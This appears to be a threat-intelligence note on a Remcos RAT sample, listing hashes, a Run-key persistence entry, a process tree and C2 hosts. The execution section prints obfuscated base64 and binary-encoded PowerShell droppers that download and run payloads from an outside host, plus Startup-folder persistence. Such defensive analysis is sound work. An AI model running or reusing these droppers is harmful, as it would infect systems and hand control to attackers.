remcos | 2022.07.14 
# --------------------------------------------------------- #
# ------------------------ SOURCE ------------------------- #
# --------------------------------------------------------- #
.exe	-	a4e2117b90eac42fda557d9e802e66a391a4d931003277196005d06ae71c6a2e
.xls 	-	6a5a00ea08e52c536ccfe19cbe673d359f74756af97775edb1802250285a580c


# --------------------------------------------------------- #
# -------------------- SANDBOX REPORT/S ------------------- #
# --------------------------------------------------------- #
https://private.tria.ge/220713-pymmvaksxg


# --------------------------------------------------------- #
# ---------------------- PERSISTENCE ---------------------- #
# --------------------------------------------------------- #
\REGISTRY\USER\S-1-5-21-3651111185-688045783-3438385971-1000\Software\Microsoft\Windows\CurrentVersion\Run\Anyzwq = "C:\\Users\\Public\\Libraries\\qwzynA.url"



# --------------------------------------------------------- #
# ----------------------- EXECUTION ----------------------- #
# --------------------------------------------------------- #
C:\Users\Admin\AppData\Local\Temp\Revised EPDA for JULY & Updated SOA Amended.exe
    "C:\Users\Admin\AppData\Local\Temp\Revised EPDA for JULY & Updated SOA Amended.exe"



C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
"C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Admin\AppData\Local\Temp\Remittance Advice.xls"

    C:\Windows\system32\cmd.exe
    C:\Windows\system32\cmd.exe /c ""C:\Users\Admin\tBvhN.bat" "

        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        PowerShell  -WindowStyle hidden IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzskdTBoajQ0dHQgPSAnW0VudW1dOjpUb09iamVjdChbU3lzdGVtLk4nICsnZXQuU2VjdXJpJyArJ3R5UHJvdG8nICsnY29sVHlwZV0sIDMwNzIpJ3xJRVg7W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSAkdTBoajQ0dDskd2UyMj0nZVcudGVOIHRjJyArICdlamJPLXdlTignOyAkYjRkZj0nb2xud29ELil0bmVpJyArICdsQ2InOyAkYzM9JyknJ3Nidi5kYXBldG9uXCcnK3BtZXQ6dm5lJCwnJ3Nidi50bmVpbEMgZGV0Y2V0b3JQL2Rscm93c2ovbW9jLmxpb2Nhdm90b2cvLzpwdHRoJycoZWxpRmRhJzskVEM9JGMzLCRiNGRmLCR3ZTIyIC1Kb2luICcnO0lFWCgoW3JlZ2V4XTo6TWF0Y2hlcygkVEMsJy4nLCdSaWdodFRvTGVmdCcpIHwgRm9yRWFjaCB7JF8udmFsdWV9KSAtam9pbiAnJyk7c3RhcnQtcHJvY2VzcygkZW52OnRlbXArICdcbm90ZXBhZC52YnMnKTtyZW1vdmUtaXRlbSAoJGVudjpVU0VSUFJPRklMRSArICdcdEJ2aE4uYmF0Jyk=')))

            C:\Windows\System32\WScript.exe
            "C:\Windows\System32\WScript.exe" "C:\Users\Admin\AppData\Local\Temp\notepad.vbs" 

                C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $t0='bE100'.replace('b','I').replace('100','x');sal P $t0;$gf=(00100100,01000101,01110010,01110010,01101111,01110010,01000001,01100011,01110100,01101001,01101111,01101110,01010000,01110010,01100101,01100110,01100101,01110010,01100101,01101110,01100011,01100101,00100000,00111101,00100000,00100111,01010011,01101001,01101100,01100101,01101110,01110100,01101100,01111001,01000011,01101111,01101110,01110100,01101001,01101110,01110101,01100101,00100111,00111011,00100100,01110100,00110101,00110110,01100110,01100111,00100000,00111101,00100000,01011011,01000101,01101110,01110101,01101101,01011101,00111010,00111010,01010100,01101111,01001111,01100010,01101010,01100101,01100011,01110100,00101000,01011011,01010011,01111001,01110011,01110100,01100101,01101101,00101110,01001110,01100101,01110100,00101110,01010011,01100101,01100011,01110101,01110010,01101001,01110100,01111001,01010000,01110010,01101111,01110100,01101111,01100011,01101111,01101100,01010100,01111001,01110000,01100101,01011101,00101100,00100000,00110011,00110000,00110111,00110010,00101001,00111011,01011011,01010011,01111001,01110011,01110100,01100101,01101101,00101110,01001110,01100101,01110100,00101110,01010011,01100101,01110010,01110110,01101001,01100011,01100101,01010000,01101111,01101001,01101110,01110100,01001101,01100001,01101110,01100001,01100111,01100101,01110010,01011101,00111010,00111010,01010011,01100101,01100011,01110101,01110010,01101001,01110100,01111001,01010000,01110010,01101111,01110100,01101111,01100011,01101111,01101100,00100000,00111101,00100000,00100100,01110100,00110101,00110110,01100110,01100111,00111011,01000001,01100100,01100100,00101101,01010100,01111001,01110000,01100101,00100000,00101101,01000001,01110011,01110011,01100101,01101101,01100010,01101100,01111001,01001110,01100001,01101101,01100101,00100000,01001101,01101001,01100011,01110010,01101111,01110011,01101111,01100110,01110100,00101110,01010110,01101001,01110011,01110101,01100001,01101100,01000010,01100001,01110011,01101001,01100011,00111011,01100100,01101111,00100000,01111011,00100100,01110000,01101001,01101110,01100111,00100000,00111101,00100000,01110100,01100101,01110011,01110100,00101101,01100011,01101111,01101110,01101110,01100101,01100011,01110100,01101001,01101111,01101110,00100000,00101101,01100011,01101111,01101101,01110000,00100000,01100111,01101111,01101111,01100111,01101100,01100101,00101110,01100011,01101111,01101101,00100000,00101101,01100011,01101111,01110101,01101110,01110100,00100000,00110001,00100000,00101101,01010001,01110101,01101001,01100101,01110100,01111101,00100000,01110101,01101110,01110100,01101001,01101100,00100000,00101000,00100100,01110000,01101001,01101110,01100111,00101001,00111011,00100100,01110100,01110100,01111001,00111101,01010000,00101000,00100111,00101000,01001110,01100101,01110111,00101101,00100111,00101011,00100111,01001111,01100010,01101010,01100101,00100111,00101011,00100111,01100011,01110100,00100000,01001110,01100101,00100111,00101011,00100111,01110100,00101110,01010111,01100101,00100111,00101011,00100111,01100010,01000011,01101100,01101001,00100111,00101011,00100111,01100101,01101110,01110100,00101001,00100111,00101001,00111011,00100100,01101101,01110110,00111101,00100000,01011011,01001101,01101001,01100011,01110010,01101111,01110011,01101111,01100110,01110100,00101110,01010110,01101001,01110011,01110101,01100001,01101100,01000010,01100001,01110011,01101001,01100011,00101110,01001001,01101110,01110100,01100101,01110010,01100001,01100011,01110100,01101001,01101111,01101110,01011101,00111010,00111010,01000011,01100001,01101100,01101100,01000010,01111001,01101110,01100001,01101101,01100101,00101000,00100100,01110100,01110100,01111001,00101100,00100111,01000100,01101111,01110111,01101110,00100111,00100000,00101011,00100000,00100111,01101100,01101111,01100001,01100100,00100111,00100000,00101011,00100000,00100111,01010011,01110100,01110010,00100111,00100000,00101011,00100000,00100111,01101001,01101110,01100111,00100111,00101100,01011011,01001101,01101001,01100011,01110010,01101111,01110011,01101111,01100110,01110100,00101110,01010110,01101001,01110011,01110101,01100001,01101100,01000010,01100001,01110011,01101001,01100011,00101110,01000011,01100001,01101100,01101100,01010100,01111001,01110000,01100101,01011101,00111010,00111010,01001101,01100101,01110100,01101000,01101111,01100100,00101100,00100111,01101000,01110100,01110100,01110000,00100111,00100000,00101011,00100000,00100111,00111010,00101111,00101111,01100111,01101111,01110100,01101111,01110110,01100001,01100011,01101111,01101001,01101100,00101110,01100011,01101111,01101101,00101111,01101010,01110011,01110111,01101111,01110010,01101100,01100100,00101111,01000101,01101110,01100011,01110010,01111001,01110000,01110100,01100101,01100100,00100000,01000011,01101100,01101001,01100101,01101110,01110100,00100000,01001111,01000111,00101110,01101010,01110000,01100111,00100111,00101001,01111100,01010000) | %{ [System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32($_,2)) };([system.String]::Join('', $gf))|P
            
                C:\WINDOWS\syswow64\notepad.exe
                "C:\WINDOWS\syswow64\notepad.exe"

                C:\WINDOWS\syswow64\notepad.exe
                "C:\WINDOWS\syswow64\notepad.exe"

            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
            "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Move-item 'C:\Users\Admin\AppData\Local\Temp\notepad.vbs' -Destination 'C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\notepad.vbs'

C:\Program Files\Internet Explorer\iexplore.exe
"C:\Program Files\Internet Explorer\iexplore.exe" -Embedding

    C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
    "C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:1240 CREDAT:82945 /prefetch:2


# --------------------------------------------------------- #
# -------------------------- C2s -------------------------- #
# --------------------------------------------------------- #
micenaxus.com:2404
remittance5443.dvrlists.com:551
